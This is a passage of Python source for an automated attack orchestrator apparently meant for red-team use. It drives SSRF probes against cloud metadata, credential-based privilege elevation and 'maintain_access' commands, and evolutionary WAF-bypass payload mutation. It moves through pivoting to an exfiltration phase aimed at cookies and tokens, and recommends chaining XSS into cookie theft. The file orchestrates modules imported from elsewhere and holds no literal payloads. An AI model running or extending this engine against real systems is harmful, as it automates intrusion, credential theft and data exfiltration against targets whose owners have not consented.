        ({Signal.HIGH_COMPOSITE_VULN},                                      DecisionPhase.EXFILTRATION),
    ],
    DecisionPhase.PIVOTING: [
        ({Signal.INTERNAL_SERVICE_REACHABLE}, DecisionPhase.EXFILTRATION),
        ({Signal.CLOUD_METADATA_HIT},         DecisionPhase.EXFILTRATION),
    ],
    DecisionPhase.EXFILTRATION: [],
    DecisionPhase.CLEANUP: [],
}


def _advance_phase(current: DecisionPhase, active: set[Signal]) -> DecisionPhase:
    transitions = PHASE_TRANSITIONS.get(current, [])
    for required_signals, next_phase in transitions:
        if required_signals.issubset(active):
            return next_phase
    return current


# ─── Action Queue ─────────────────────────────────────────────────────────────

class ActionQueue:
    def __init__(self):
        self._queue: list[DecisionAction] = []
        self._executed_ids: set[str] = set()

    def push(self, action: DecisionAction) -> None:
        if action.action_id not in self._executed_ids:
            self._queue.append(action)
            self._queue.sort(key=lambda a: -a.priority)

    def pop(self) -> Optional[DecisionAction]:
        while self._queue:
            a = self._queue.pop(0)
            if a.action_id not in self._executed_ids:
                return a
        return None

    def mark_executed(self, action_id: str) -> None:
        self._executed_ids.add(action_id)

    def has_pending(self) -> bool:
        return any(a.action_id not in self._executed_ids for a in self._queue)

    def pending_count(self) -> int:
        return sum(1 for a in self._queue if a.action_id not in self._executed_ids)

    def all_queued(self) -> list[DecisionAction]:
        return list(self._queue)


# ─── Signal State Manager ─────────────────────────────────────────────────────

class SignalState:
    def __init__(self):
        self._weights: dict[Signal, SignalWeight] = {}

    def emit(self, signal: Signal, weight: float = 1.0, decay_rate: float = 0.0) -> None:
        if signal in self._weights:
            existing = self._weights[signal]
            self._weights[signal] = SignalWeight(
                signal=signal,
                weight=max(existing.weight, weight),
                decay_rate=min(existing.decay_rate, decay_rate),
            )
        else:
            self._weights[signal] = SignalWeight(signal=signal, weight=weight, decay_rate=decay_rate)

    def active(self) -> set[Signal]:
        return {sw.signal for sw in self._weights.values() if sw.effective_weight() > 0.05}

    def weight(self, signal: Signal) -> float:
        sw = self._weights.get(signal)
        return sw.effective_weight() if sw else 0.0

    def all_signals(self) -> list[Signal]:
        return list(self._weights.keys())

    def ingest_module_output(self, module_key: str, result: dict) -> list[Signal]:
        extractor = SIGNAL_EXTRACTORS.get(module_key)
        if not extractor:
            return []
        new_signals = extractor(result)
        for sig in new_signals:
            self.emit(sig)
        return new_signals


# ─── Module Dispatcher ────────────────────────────────────────────────────────

class ModuleDispatcher:
    def __init__(self, target_url: str, scan_results: dict):
        self.target_url = target_url
        self.scan_results = scan_results

    async def dispatch(self, action: DecisionAction) -> tuple[bool, dict, list[Signal]]:
        module = action.target_module
        params = action.params

        if module == "ssrf_probe" and action.action_type == ActionType.PROBE_METADATA:
            return await self._probe_metadata(params)
        if module == "session_manager" and action.action_type in (ActionType.ELEVATE_SESSION, ActionType.CHAIN_ATTACK, ActionType.BRUTE_ENDPOINT, ActionType.DEEPEN_SCAN):
            return await self._run_session_manager(params)
        if module == "payload_mutator" and action.action_type in (ActionType.MUTATE_PAYLOAD, ActionType.DEEPEN_SCAN):
            return await self._run_payload_mutator(params)
        if module == "pipeline" and action.action_type == ActionType.ADJUST_TIMING:
            return await self._adjust_pipeline_timing(params)
        if module == "ai_exfil_planner":
            return await self._stub_exfil_planner(params)
        if module == "ai_lateral_mover":
            return await self._stub_lateral_mover(params)
        return False, {"skipped": True, "module": module}, []

    async def _probe_metadata(self, params: dict) -> tuple[bool, dict, list[Signal]]:
        from utils.ssrf_prober import run_ssrf_probe
        confirmed_params = params.get("confirmed_params", [])
        all_findings = []
        for target_info in confirmed_params[:3]:
            endpoint = target_info.get("endpoint", self.target_url)
            if not endpoint:
                endpoint = self.target_url
            result = run_ssrf_probe(
                target_url=endpoint,
                concurrency=params.get("concurrency", 3),
                delay=params.get("delay", 0.5),
                max_params=5,
                test_headers=False,
                test_json=False,
            )
            all_findings.extend(result.get("findings", []))
        merged = {"findings": all_findings, "target": self.target_url}
        self.scan_results["ssrf_probe_deep"] = merged
        sigs = _signals_from_ssrf(merged)
        return bool(all_findings), merged, sigs

    async def _run_session_manager(self, params: dict) -> tuple[bool, dict, list[Signal]]:
        from utils.ai_session_manager import run_session_manager
        creds = params.get("credentials", [])
        if not creds:
            return False, {"skipped": True, "reason": "no_credentials"}, []
        result = run_session_manager(
            target_url=self.target_url,
            credentials=creds,
            commands=params.get("commands", ["elevate_privilege", "maintain_access"]),
            delay=params.get("delay", 0.4),
            proxy=params.get("proxy"),
        )
        self.scan_results["session_manager"] = result
        sigs = _signals_from_session(result)
        return result.get("final_state") not in ("unauthenticated", "dead"), result, sigs

    async def _run_payload_mutator(self, params: dict) -> tuple[bool, dict, list[Signal]]:
        from utils.ai_payload_mutator import run_payload_mutator
        categories = params.get("categories", ["xss"])
        all_results = []
        best_overall = None
        best_score = 0.0
        for category in categories[:3]:
            result = run_payload_mutator(
                target_url=self.target_url,
                param=params.get("param", "q"),
                category=category,
                evolution_target=params.get("evolution_target", "waf_bypass"),
                generations=params.get("generations", 7),
                population_size=params.get("population_size", 15),
                concurrency=params.get("concurrency", 3),
                waf_vendor=params.get("waf_vendor", "generic"),
            )
            all_results.append(result)
            score = result.get("best_payload", {}).get("fitness_score", 0)
            if score > best_score:
                best_score = score
                best_overall = result
        merged = best_overall or {"error": "no_result"}
        self.scan_results["payload_mutator"] = merged
        sigs = _signals_from_mutator(merged)
        return best_score > 0.3, merged, sigs

    async def _adjust_pipeline_timing(self, params: dict) -> tuple[bool, dict, list[Signal]]:
        new_delay = params.get("new_delay", 1.0)
        self.scan_results["_timing_override"] = {
            "delay": new_delay,
            "concurrency": params.get("new_concurrency", 2),
            "jitter": params.get("jitter", True),
        }
        return True, {"timing_adjusted": True, "new_delay": new_delay}, []

    async def _stub_exfil_planner(self, params: dict) -> tuple[bool, dict, list[Signal]]:
        plan = {
            "channels": params.get("channels", ["http_oob"]),
            "data_targets": params.get("data_targets", ["cookies", "tokens"]),
            "stealth_mode": params.get("stealth_mode", False),
            "status": "planned",
            "note": "ai_exfil_planner module not yet built — stub output",
        }
        self.scan_results["exfil_plan"] = plan
        return True, plan, []

    async def _stub_lateral_mover(self, params: dict) -> tuple[bool, dict, list[Signal]]:
        plan = {
            "internal_targets": params.get("internal_targets", []),
            "pivot_endpoints": params.get("pivot_endpoints", []),
            "status": "planned",
            "note": "ai_lateral_mover module not yet built — stub output",
        }
        self.scan_results["lateral_move_plan"] = plan
        return True, plan, [Signal.PIVOT_ENDPOINT_FOUND] if plan["pivot_endpoints"] else []


# ─── Narrative Builder ────────────────────────────────────────────────────────

def _build_attack_narrative(
    target_url: str,
    signals: list[Signal],
    cycles: list[DecisionCycle],
    scan_results: dict,
) -> str:
    parts: list[str] = []
    parts.append(f"Target: {target_url} | {len(cycles)} decision cycles | {len(signals)} signals captured")

    phase_path = [c.phase.value for c in cycles]
    unique_phases = []
    for p in phase_path:
        if not unique_phases or unique_phases[-1] != p:
            unique_phases.append(p)
    if unique_phases:
        parts.append(f"Phase progression: {' → '.join(unique_phases)}")

    if Signal.CLOUD_METADATA_HIT in signals:
        parts.append("CRITICAL: Cloud metadata endpoint reached — IAM credential extraction path confirmed")
    if Signal.CREDS_VALID in signals:
        parts.append("CRITICAL: Valid credentials confirmed via spray — authentication bypass achieved")
    if Signal.AUTH_BYPASSED in signals:
        parts.append("HIGH: Authentication bypassed — elevated privilege obtained")
    if Signal.SSRF_CONFIRMED in signals:
        parts.append("HIGH: SSRF confirmed — server-side request forgery pathway open")
    if Signal.PAYLOAD_BYPASS_CONFIRMED in signals:
        parts.append("HIGH: WAF/filter bypass confirmed — injection payload reached application logic")
    if Signal.SESSION_ELEVATED in signals:
        parts.append("HIGH: Session privilege elevated — administrative access confirmed")

    total_actions = sum(len(c.actions_executed) for c in cycles)
    total_queued = sum(len(c.actions_queued) for c in cycles)
    parts.append(f"Actions: {total_queued} queued, {total_actions} executed")

    return " | ".join(parts)


def _recommend_next(signals: set[Signal], scan_results: dict) -> list[str]:
    recs: list[str] = []
    if Signal.CLOUD_METADATA_HIT in signals:
        recs.append("Run ai_exfil_planner to map IAM credential extraction chain")
    if Signal.INTERNAL_SERVICE_REACHABLE in signals:
        recs.append("Run ai_lateral_mover to map internal service topology")
    if Signal.PAYLOAD_BYPASS_CONFIRMED in signals and Signal.SSTI_TRIGGERED not in signals:
        recs.append("Run payload_mutator with category=ssti to test template injection RCE")
    if Signal.CREDS_VALID in signals and Signal.SESSION_ELEVATED not in signals:
        recs.append("Run session_manager with elevated credentials and pivot commands")
    if Signal.XSS_REFLECTED in signals and Signal.SESSION_ELEVATED not in signals:
        recs.append("Chain XSS into cookie theft via CORS endpoint if cors_exploitable")
    if Signal.TIMING_ORACLE_PRESENT in signals:
        recs.append("Run targeted user enumeration via timing oracle with known username list")
    if not recs:
        recs.append("Run ai_report_generator to consolidate findings into red team report")
    return recs


# ─── Decision Engine ──────────────────────────────────────────────────────────

class AIDecisionEngine:
    def __init__(
        self,
        target_url: str,
        scan_results: dict,
        mode: EngineMode = EngineMode.BALANCED,
        max_cycles: int = 12,
        max_actions_per_cycle: int = 4,
        cycle_delay: float = 0.2,
    ):
        self.target_url = target_url
        self.scan_results = scan_results
        self.mode = mode
        self.max_cycles = max_cycles
        self.max_actions_per_cycle = max_actions_per_cycle
        self.cycle_delay = cycle_delay

        self.session_id = str(uuid.uuid4())[:12]
        self.signal_state = SignalState()
        self.action_queue = ActionQueue()
        self.decision_cycles: list[DecisionCycle] = []
        self.execution_history: list[ExecutionRecord] = []
        self.all_actions: list[DecisionAction] = []
        self.current_phase = DecisionPhase.RECONNAISSANCE
        self.dispatcher = ModuleDispatcher(target_url, scan_results)

        self._rule_fire_counts: dict[str, int] = {r.rule_id: 0 for r in DECISION_RULES}
        self._start_time: float = 0.0

    def _ingest_initial_signals(self) -> None:
        for module_key, extractor in SIGNAL_EXTRACTORS.items():
            result = self.scan_results.get(module_key, {})
            if result:
                new_sigs = self.signal_state.ingest_module_output(module_key, result)
                for s in new_sigs:
                    if s == Signal.WAF_PRESENT and self.mode == EngineMode.STEALTH:
                        self.signal_state.emit(s, weight=0.8, decay_rate=0.001)
                    else:
                        self.signal_state.emit(s, weight=1.0)

        if self.scan_results.get("auth_endpoints"):
            self.signal_state.emit(Signal.AUTH_ENDPOINT_FOUND)

    def _evaluate_rules(self) -> list[DecisionAction]:
        active = self.signal_state.active()
        new_actions: list[DecisionAction] = []

        mode_priority_multipliers = {
            EngineMode.AGGRESSIVE: 1.2,
            EngineMode.STEALTH:    0.7,
            EngineMode.BALANCED:   1.0,
            EngineMode.FAST:       0.9,
            EngineMode.THOROUGH:   1.1,
        }
        multiplier = mode_priority_multipliers.get(self.mode, 1.0)

        for rule in DECISION_RULES:
            if not rule.can_fire(active, self.mode):
                continue
            existing_ids = {a.action_id for a in self.all_actions}
            candidate_id = f"ACT-{rule.rule_id}-{self.session_id}"
            if candidate_id in existing_ids:
                continue
            priority = rule.priority(active, self.scan_results) * multiplier
            params = rule.params_builder(self.scan_results, list(active))
            action = DecisionAction(
                action_id=candidate_id,
                action_type=rule.action_type,
                target_module=rule.target_module,
                priority=round(priority, 4),
                phase=rule.phase,
                rationale=rule.description,
                params=params,
            )
            new_actions.append(action)
            self.all_actions.append(action)
            rule.fires += 1

        new_actions.sort(key=lambda a: -a.priority)
        if self.mode == EngineMode.FAST:
            new_actions = new_actions[:2]
        elif self.mode == EngineMode.STEALTH:
            new_actions = new_actions[:1]

        return new_actions

    def _update_phase(self) -> None:
        active = self.signal_state.active()
        new_phase = _advance_phase(self.current_phase, active)
        if new_phase != self.current_phase:
            self.current_phase = new_phase

    def _compute_cycle_score(self, executed: list[ExecutionRecord]) -> float:
        if not executed:
            return 0.0
        active = self.signal_state.active()
        base = len(active) / max(len(Signal), 1)
        success_rate = sum(1 for e in executed if e.success) / len(executed)
        new_signal_rate = sum(len(e.signals_emitted) for e in executed) / max(len(executed), 1) / max(len(Signal), 1)
        return round(base * 0.4 + success_rate * 0.4 + new_signal_rate * 0.2, 4)

    async def _execute_action(self, action: DecisionAction) -> ExecutionRecord:
        t0 = time.monotonic()
        success, output, new_signals = await self.dispatcher.dispatch(action)

        for sig in new_signals:
            decay = 0.002 if self.mode == EngineMode.STEALTH else 0.0
            self.signal_state.emit(sig, weight=1.0, decay_rate=decay)

        action.executed = True
        action.result = output
        self.action_queue.mark_executed(action.action_id)

        output_summary = json.dumps({k: v for k, v in output.items() if k != "findings"}, default=str)[:300] if output else ""

        return ExecutionRecord(
            action=action,
            started_at=t0,
            finished_at=time.monotonic(),
            success=success,
            output_summary=output_summary,
            signals_emitted=new_signals,
            new_actions_queued=[],
        )

    async def run(self) -> EngineReport:
        self._start_time = time.monotonic()
        self._ingest_initial_signals()

        for cycle_num in range(self.max_cycles):
            cycle_t0 = time.monotonic()
            self._update_phase()
            active_signals = list(self.signal_state.active())

            new_actions = self._evaluate_rules()
            for action in new_actions:
                self.action_queue.push(action)

            cycle_actions_queued: list[DecisionAction] = []
            cycle_executed: list[ExecutionRecord] = []

            for _ in range(self.max_actions_per_cycle):
                action = self.action_queue.pop()
                if not action:
                    break
                if action.action_type == ActionType.SKIP:
                    continue
                if action.action_type == ActionType.HALT:
                    break
                cycle_actions_queued.append(action)
                record = await self._execute_action(action)
                cycle_executed.append(record)
                self.execution_history.append(record)

                for new_sig in record.signals_emitted:
                    re_evaluated = self._evaluate_rules()
                    for a in re_evaluated:
                        self.action_queue.push(a)
                        record.new_actions_queued.append(a.action_id)

                await asyncio.sleep(self.cycle_delay)

            cycle_score = self._compute_cycle_score(cycle_executed)

            self.decision_cycles.append(DecisionCycle(
                cycle_id=f"CYC-{cycle_num:03d}",
                phase=self.current_phase,
                signals_active=active_signals,
                actions_evaluated=len(new_actions),
                actions_queued=cycle_actions_queued,
                actions_executed=cycle_executed,
                cycle_score=cycle_score,
                duration_ms=round((time.monotonic() - cycle_t0) * 1000, 2),
            ))

            if not self.action_queue.has_pending() and not new_actions:
                break

            if self.current_phase == DecisionPhase.EXFILTRATION:
                break

        final_signals = list(self.signal_state.active())
        risk_tier = self._compute_risk_tier(final_signals)
        narrative = _build_attack_narrative(
            self.target_url, final_signals, self.decision_cycles, self.scan_results
        )
        recommendations = _recommend_next(set(final_signals), self.scan_results)

        return EngineReport(
            session_id=self.session_id,
            target_url=self.target_url,
            mode=self.mode,
            total_cycles=len(self.decision_cycles),
            final_phase=self.current_phase,
            risk_tier=risk_tier,
            signals_captured=final_signals,
            all_actions=self.all_actions,
            execution_history=self.execution_history,
            decision_cycles=self.decision_cycles,
            final_scan_results=self.scan_results,
            attack_narrative=narrative,
            recommended_next=recommendations,
            duration_seconds=round(time.monotonic() - self._start_time, 2),
        )

    def _compute_risk_tier(self, signals: list[Signal]) -> RiskTier:
        critical_signals = {
            Signal.CLOUD_METADATA_HIT, Signal.CREDS_VALID, Signal.AUTH_BYPASSED,
            Signal.SESSION_ELEVATED, Signal.SSTI_TRIGGERED,
        }
        high_signals = {
            Signal.SSRF_CONFIRMED, Signal.PAYLOAD_BYPASS_CONFIRMED, Signal.INTERNAL_SERVICE_REACHABLE,
            Signal.SQLI_ERROR_TRIGGERED, Signal.PATH_TRAVERSAL_CONFIRMED,
        }
        signal_set = set(signals)
        if signal_set & critical_signals:
            return RiskTier.CRITICAL
        if signal_set & high_signals:
            return RiskTier.HIGH
        medium_signals = {
            Signal.WAF_BYPASSABLE, Signal.CORS_EXPLOITABLE, Signal.OPEN_REDIRECT_CONFIRMED,
            Signal.JS_SECRET_EXPOSED, Signal.XSS_REFLECTED, Signal.HEADER_INJECTABLE,
        }
        if signal_set & medium_signals:
            return RiskTier.MEDIUM
        if signals:
            return RiskTier.LOW
        return RiskTier.UNKNOWN


# ─── Serializer ───────────────────────────────────────────────────────────────

def serialize_report(report: EngineReport) -> dict:
    def action_to_dict(a: DecisionAction) -> dict:
        return {
            "action_id": a.action_id,
            "type": a.action_type.value,
            "module": a.target_module,
            "priority": a.priority,
            "phase": a.phase.value,
            "rationale": a.rationale,
            "params_keys": list(a.params.keys()),
            "executed": a.executed,
            "result_summary": str(a.result)[:200] if a.result else None,
        }

    def exec_to_dict(e: ExecutionRecord) -> dict:
        return {
            "action_id": e.action.action_id,
            "type": e.action.action_type.value,
            "module": e.action.target_module,
            "success": e.success,
            "signals_emitted": [s.value for s in e.signals_emitted],
            "new_actions_queued": e.new_actions_queued,
            "output_summary": e.output_summary,
            "duration_ms": round((e.finished_at - e.started_at) * 1000, 2),
        }

    def cycle_to_dict(c: DecisionCycle) -> dict:
        return {
            "cycle_id": c.cycle_id,
            "phase": c.phase.value,
            "signals_active": [s.value for s in c.signals_active],
            "actions_evaluated": c.actions_evaluated,
            "actions_queued": len(c.actions_queued),
            "actions_executed": len(c.actions_executed),
            "cycle_score": c.cycle_score,
            "duration_ms": c.duration_ms,
        }

    return {
        "session_id": report.session_id,
        "target": report.target_url,
        "mode": report.mode.value,
        "total_cycles": report.total_cycles,
        "final_phase": report.final_phase.value,
        "risk_tier": report.risk_tier.value,
        "signals_captured": [s.value for s in report.signals_captured],
        "attack_narrative": report.attack_narrative,
        "recommended_next": report.recommended_next,
        "duration_seconds": report.duration_seconds,
        "total_actions": len(report.all_actions),
        "total_executed": len(report.execution_history),
        "actions": [action_to_dict(a) for a in report.all_actions],
        "execution_history": [exec_to_dict(e) for e in report.execution_history],
        "decision_cycles": [cycle_to_dict(c) for c in report.decision_cycles],
    }


# ─── Public Entry Point ───────────────────────────────────────────────────────

def run_decision_engine(
    target_url: str,
    scan_results: dict,
    mode: str = "balanced",
    max_cycles: int = 12,
    max_actions_per_cycle: int = 4,
    cycle_delay: float = 0.2,
) -> dict:
    try:
        engine_mode = EngineMode(mode)
    except ValueError:
        engine_mode = EngineMode.BALANCED

    engine = AIDecisionEngine(
        target_url=target_url,
        scan_results=scan_results,
        mode=engine_mode,
        max_cycles=max_cycles,
        max_actions_per_cycle=max_actions_per_cycle,
        cycle_delay=cycle_delay,
    )
    return serialize_report(asyncio.run(engine.run()))